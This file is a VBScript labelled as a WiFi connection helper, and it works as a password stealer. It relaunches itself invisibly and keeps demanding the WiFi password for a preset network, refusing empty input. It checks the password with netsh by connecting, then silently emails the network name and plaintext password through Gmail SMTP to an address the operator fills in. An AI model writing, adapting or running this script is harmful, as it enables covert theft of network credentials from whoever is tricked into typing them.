' wifi_connect.vbs
' Invisible runner
If WScript.Arguments.Count = 0 Then
    Set oShell = CreateObject("WScript.Shell")
    oShell.Run "wscript.exe """ & WScript.ScriptFullName & """ run", 0, False
    WScript.Quit
End If

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Helper: run command and return stdout as string
Function ExecCmd(cmd)
    Dim execObj, output
    Set execObj = shell.Exec("%COMSPEC% /c " & cmd)
    output = ""
    On Error Resume Next
    ' wait until finished
    Do While execObj.Status = 0
        WScript.Sleep 200
    Loop
    output = execObj.StdOut.ReadAll
    ExecCmd = output
End Function

' Helper: check if currently connected to the given SSID
Function IsConnectedTo(targetSSID)
    Dim out, sstate, sssid
    out = ExecCmd("netsh wlan show interfaces")
    sstate = LCase(out)
    If InStr(sstate, "state") = 0 Then
        IsConnectedTo = False
        Exit Function
    End If
    ' check for "state : connected" and SSID line
    If InStr(LCase(out), "state") > 0 And InStr(LCase(out), "connected") > 0 Then
        ' find SSID line
        If InStr(out, "SSID") > 0 Then
            ' simple substring match
            If InStr(out, targetSSID) > 0 Then
                IsConnectedTo = True
                Exit Function
            End If
        End If
    End If
    IsConnectedTo = False
End Function

Function ForceInput(prompt)
    Dim userInput
    Do
        userInput = ""
        userInput = CreateObject("WScript.Shell").Popup(prompt, 0, "Input Required", 0 + 64) ' Only OK button
        userInput = InputBox(prompt) ' User must type after OK
        If userInput = "" Then
            MsgBox "You must enter a value. Cancel is not allowed.", 48, "Required"
        End If
    Loop While userInput = ""
    ForceInput = userInput
End Function

ssid = "--if you see this massage you dont set the ssid--"
' InputBox("Enter WiFi SSID:")
If ssid = "" Then WScript.Quit

Do
    password = ForceInput("Enter WiFi Password for SSID: " & ssid)
    If password = "" Then
        ' user cancelled or empty -> exit
        WScript.Quit
    End If

    tempProfile = shell.ExpandEnvironmentStrings("%TEMP%\") & "wifi_profile.xml"

    ' build profile XML
    profileXML = ""
    profileXML = profileXML & "<?xml version=""1.0""?>" & vbCrLf
    profileXML = profileXML & "<WLANProfile xmlns=""http://www.microsoft.com/networking/WLAN/profile/v1"">" & vbCrLf
    profileXML = profileXML & "  <name>" & ssid & "</name>" & vbCrLf
    profileXML = profileXML & "  <SSIDConfig>" & vbCrLf
    profileXML = profileXML & "    <SSID>" & vbCrLf
    profileXML = profileXML & "      <name>" & ssid & "</name>" & vbCrLf
    profileXML = profileXML & "    </SSID>" & vbCrLf
    profileXML = profileXML & "  </SSIDConfig>" & vbCrLf
    profileXML = profileXML & "  <connectionType>ESS</connectionType>" & vbCrLf
    profileXML = profileXML & "  <connectionMode>manual</connectionMode>" & vbCrLf
    profileXML = profileXML & "  <MSM>" & vbCrLf
    profileXML = profileXML & "    <security>" & vbCrLf
    profileXML = profileXML & "      <authEncryption>" & vbCrLf
    profileXML = profileXML & "        <authentication>WPA2PSK</authentication>" & vbCrLf
    profileXML = profileXML & "        <encryption>AES</encryption>" & vbCrLf
    profileXML = profileXML & "        <useOneX>false</useOneX>" & vbCrLf
    profileXML = profileXML & "      </authEncryption>" & vbCrLf
    profileXML = profileXML & "      <sharedKey>" & vbCrLf
    profileXML = profileXML & "        <keyType>passPhrase</keyType>" & vbCrLf
    profileXML = profileXML & "        <protected>false</protected>" & vbCrLf
    profileXML = profileXML & "        <keyMaterial>" & password & "</keyMaterial>" & vbCrLf
    profileXML = profileXML & "      </sharedKey>" & vbCrLf
    profileXML = profileXML & "    </security>" & vbCrLf
    profileXML = profileXML & "  </MSM>" & vbCrLf
    profileXML = profileXML & "</WLANProfile>"

    ' write temp file
    On Error Resume Next
    Set file = fso.CreateTextFile(tempProfile, True)
    file.Write profileXML
    file.Close
    On Error Goto 0

    ' add profile and attempt to connect
    ExecCmd "netsh wlan add profile filename=""" & tempProfile & """"
    ExecCmd "netsh wlan connect name=""" & ssid & """"

    ' wait and poll for connection (max 25 seconds)
    connected = False
    attempts = 0
    Do While attempts < 25
        If IsConnectedTo(ssid) Then
            connected = True
            Exit Do
        End If
        WScript.Sleep 1000
        attempts = attempts + 1
    Loop

    ' delete temp xml file (we keep profile as requested)
    On Error Resume Next
    fso.DeleteFile tempProfile
    On Error Goto 0

    If connected Then
        Exit Do  ' success -> break out of password loop
    Else
        ' not connected -> ask again (loop)
        ret = MsgBox("Connection to SSID '" & ssid & "' failed. Do you want to try the password again?", vbYes + vbExclamation, "Connection failed")
        If ret = vbNo Then
            WScript.Quit
        End If
        ' otherwise loop to InputBox for password again
    End If
Loop

' If we reach here, connection successful — send email
On Error Resume Next
Set msg = CreateObject("CDO.Message")
msg.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
msg.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.gmail.com"
msg.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 465
msg.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpusessl") = True
msg.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1

' ----- CHANGE THESE -----
msg.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendusername") = "YOUR_EMAIL"
msg.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendpassword") = "YOUR_APP_PASSWORD"
msg.To = "YOUR_EMAIL"
msg.From = "YOUR_EMAIL"
' ------------------------

msg.Configuration.Fields.Update

msg.Subject = "WiFi Connected: " & ssid 
msg.TextBody = "Device connected to WiFi SSID: " & ssid & vbCrLf & "password: " & password & vbCrLf & "Time: " & Now()
msg.Send
On Error Goto 0

' done (silent exit)
WScript.Quit
